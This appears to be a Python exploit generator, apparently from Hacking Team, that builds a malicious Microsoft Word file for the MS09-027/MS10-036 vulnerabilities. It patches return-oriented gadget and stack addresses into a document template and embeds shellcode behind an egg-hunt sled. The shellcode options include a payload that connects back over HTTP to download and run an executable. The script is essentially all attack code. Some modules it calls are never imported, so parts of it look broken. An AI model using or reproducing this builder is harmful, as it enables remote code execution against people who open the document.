#! /usr/bin/env python

#Copyright HT srl, 2009-2010
#http://www.hackingteam.it/ for more information

#cod

# Microsoft Word 0day


import os
import sys
import math
import warnings

if "." not in sys.path: sys.path.append(".")
if "encoders" not in sys.path: sys.path.append("encoders")
if "payloads" not in sys.path: sys.path.append("payloads")

import time
import struct
import random
import zlib
import copy
import zipfile

import jscript_unicode
import x86shelldrophttp
import x86int3
import ASCIIHexWhitespace
import x86helloworld

from resources import compressedfile

NAME='Microsoft Word XP/2007'
DESCRIPTION='[+] MS09-027/MS10-036'

DOCUMENTATION={}
DOCUMENTATION['Vendor']='Microsoft'
DOCUMENTATION['Date public']='N/A'
DOCUMENTATION['References']='http://www.microsoft.com/'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']='Microsoft Word XP/2007'
DOCUMENTATION['CVE']='CVE-????-????'
DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-????-????"

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP', 'VISTA', 'SEVEN']
PROPERTY['VENDOR']='Microsoft'
PROPERTY['DELIVERY']='HTTP'

NOTES="""
Tested on:
Windows XP Professional SP3 English with Microsoft Office XP/2007
"""

CHANGELOG="""
"""

# Global payload
payload = 0
officeVer = 0

#from pyPdf.pdf import *
#from pyPdf.generic import *
#from pyPdf.filters import *

class ms09_027():
	def __init__(self, inputFile, outputFile, dbg):
		#self.setInfo(DESCRIPTION)
		self.name=NAME
		self.debugmode = dbg

		#self.source_pdf = 'resources/blank.pdf'
		self.dest_doc = outputFile
		self.infile = inputFile
		
		return

	def createShellcode(self):
		result = None
		
		if payload == 0:
			obj = x86shelldrop.x86shelldrop()
			x = obj.get(self.infile)
			#result = struct.pack('l', len(x)+4) + x
			result = x
		elif payload == 1:
			obj = x86shelldrophttp.x86shelldrophttp()
			x = obj.get(self.infile)
			result = x
		elif payload == 2:
			obj = x86helloworld.x86helloworld()
			x = obj.get()
			result = x
		elif payload == 3:
			obj = x86calc.x86calc()
			x = obj.get()
			result = x

		if self.debugmode == True:
			obj = x86int3.x86int3()
			result = obj.get() + result
			
		return result

	def make_doc(self):
		if officeVer == 0:
			print "make_doc: Unsupported version"
			return 0
			
		input = bytearray(zlib.decompress(self.compressedfile))
		#input = bytearray(self.compressedfile)
		
		#secondstage = 
		shellcode = self.createShellcode()
		
		for i in range(0,2):
			if officeVer == 1:
				input[0x3DC7 + i] = b"\x23\xD7"[i]                       #0x314DD723 = add esp, 0Ch; pop pop pop ret in wwlib.dll (Word 2007 SP2 MS09-027)
			elif officeVer == 2:
				input[0x3DC7 + i] = b"\xf7\x55"[i]                       #0x315166F7 = add esp, 0Ch; pop pop pop ret in wwlib.dll (Word 2007 SP2 MS10-036)
			elif officeVer == 3:
				input[0x3DC7 + i] = b"\xba\x3f"[i]						 #0x31513FBA  = add esp, 0Ch; pop pop pop ret in wwlib.dll (Word 2007 SP2 MS10-056)

		for i in range(0,4):
			if officeVer == 1:
				input[0x3E5F + i] = b"\x73\x03\x25\x31"[i]               #jmp esp in wwlib.dll (Word 2007 SP2 MS09-027)
			elif officeVer == 2:
				input[0x3E5F + i] = b"\xdb\x8b\x37\x31"[i]               #jmp esp in wwlib.dll (Word 2007 SP2 MS10-036)
			elif officeVer == 3:
				input[0x3E5F + i] = b"\xc3\x8b\x37\x31"[i]				 #jmp esp in wwlib.dll (Word 2007 SP2 MS10-056)

			input[0x400D + i] = b"\x3E\xEC\x8F\x30"[i]               #pop * 5; add esp, 434h; retn in Winword.exe (Word XP SP3)
			input[0x3FDC] = b"\x98"[0]                               #0x301A2F98 = mov eax, [ebp+8]; mov ecx, [ebp-4]; mov [eax+81h], ecx in Winword.exe (Word XP SP3)
			input[0x3FD8 + i] = b"\x28\x6B\x12\x00"[i]               #stack address (Word XP SP3)
			input[0x3FE8 + i] = b"\x16\x6B\x12\x00"[i]               #stack address (Word XP SP3)
			input[0x4019 + i] = b"\x33\xFF\x12\x00"[i]               #stack address, overwrite SEH (Word XP SP3)
			
		offset = 0x0B30
		for i in range(0,256):
			input[offset + i] = b"\x90\x41"[i%2]                     #egg hunted

		for i in range(0,len(shellcode)):
			input[offset + 0x100 + i] = shellcode[i]

		print "Creating %s file"%(self.dest_doc)	
		f = open(self.dest_doc,mode='wb')
		f.write(input)
		f.close()
		
		return 0

	def run(self):
		return self.make_doc()

if __name__=='__main__':
	dbg = False
	http = False
	
	if len(sys.argv) < 5:
		print "[ERROR] %s require 4 parameters"%(DESCRIPTION)
		print "[-INFO] {payload:[http|debug|hello|calc]} version:VERSION [DROPFILE] destination"
		print "[VERSION] kb2251419 MS10-056 (08/10/2010)"
		print "[VERSION] kb982135 MS10-036 (06/04/2010)"
		print "[VERSION] kb969604 MS09-027 (06/09/2009)"
		
		sys.exit(0)

	# Parse payload section
	if sys.argv[1].split(':')[0] != "payload":
		print "[ERROR] First parameters must be payload"
		sys.exit(0)
	else:
		requiredpayload = sys.argv[1].split(':')[1]	
		if requiredpayload == "http":
			print "[HTTP] Using HTTP reverse connect to download exe"
			payload = 1
			http = True
		elif requiredpayload == "debug":
			print "[DEBUG] Using INT3 exploit mode"
			payload = 0
			dbg = True
		elif requiredpayload == "hello":
			print "[HELLOWORLD] Using HelloWorld payload"
			payload = 2
		elif requiredpayload == "calc":
			print "[CALC] Using calc payload"
			payload = 3
		else:
			print "[ERROR] Unknown payload defined"
			sys.exit(0)
	
	# Interprete section
	
	if http == False:
		if os.path.isfile(sys.argv[3]) == False:
			print "[ERROR] File %s doesn't exists."%(sys.argv[3])
			sys.exit(0)

		if os.path.getsize(sys.argv[3]) == 0:
			print "[ERROR] File %s has length zero."%(sys.argv[3])
			sys.exit(0)

	#if os.path.isfile("resources/blank.pdf") == False:
	#	print "[ERROR] resources/blank.pdf not found"
	#	sys.exit(0)
	
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)
	
	if sys.argv[2].split(':')[0] != "version":
		print "[ERROR] Parameter version not specified"
	else:
		requiredversion = sys.argv[2].split(':')[1]
		if requiredversion == "kb969604":
			officeVer = 1
		elif requiredversion == "kb982135":
			officeVer = 2
		elif requiredversion == "kb2251419":
			officeVer = 3
		else:
			officeVer = 0
			print "[WARNING] Unknown version. Unpatched output"
			

	app=ms09_027(sys.argv[3], sys.argv[4], dbg)
	app.run()
	
	print ' ... done'